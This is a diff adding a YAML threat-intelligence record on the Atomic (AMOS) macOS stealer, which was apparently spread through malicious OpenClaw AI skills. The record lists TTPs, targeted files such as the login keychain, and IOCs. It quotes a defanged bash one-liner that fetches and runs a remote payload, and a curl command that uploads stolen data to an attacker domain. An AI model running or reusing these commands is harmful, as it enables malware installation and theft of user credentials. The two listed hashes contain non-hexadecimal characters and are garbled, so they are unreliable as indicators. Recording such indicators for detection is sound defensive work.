@@ -1,0 +1,46 @@
+description: Atomic (AMOS) Stealer distributed via malicious OpenClaw skills, exploiting
+  AI workflows to trick users into installing malware.
+malware_families:
+- Trojan.MacOS.Amos
+TTPs:
+  processes:
+  - bash
+  - curl
+  commandline:
+  - /bin/bash -c "$(curl -fsSL hxxp://91.92.242.30/ece0f208u7uqhs6x)"
+  - curl -X POST hxxps://socifiapp[.]com/api/reports/upload -F user_id=47 -F build_tag=jhzhhfomng
+    -F report_file=@FILENAME.zip
+  powershell: []
+  scripting_engine:
+  - bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - curl, hxxp://91.92.242.30/ece0f208u7uqhs6x
+  - curl -X POST hxxps://socifiapp[.]com/api/reports/upload
+  file_activity:
+  - /Users/macuser/Downloads/il24xgriequcys45
+  - /Users/macuser/Documents/
+  - /Users/macuser/Downloads/
+  - /Users/macuser/Desktop/
+  - /Users/macuser/Library/Keychains/login.keychain-db
+  - /Users/macuser/Library/Application Support/com.apple.notes/
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes:
+  - eS5eb2fdbald6e799a9db6e39f133b82c5b08259
+  - F7b5831dd7393d81070bB31F31as90BCCRLEACER
+  ip_addresses:
+  - 91.92.242.30
+  domains:
+  - socifiapp[.]com
+  - openclawcli[.]vercel[.]app
+  urls:
+  - hxxp://91.92.242.30/ece0f208u7uqhs6x
+  - hxxps://socifiapp[.]com/api/reports/upload
+authors:
+- TrendAITM Research
+reference: https://www.trendmicro.com/en_us/research/26/b/openclaw-skills-used-to-distribute-atomic-macos-stealer.html
+date_of_publication: February 23, 2026
+file_creation_date: March 01, 2026
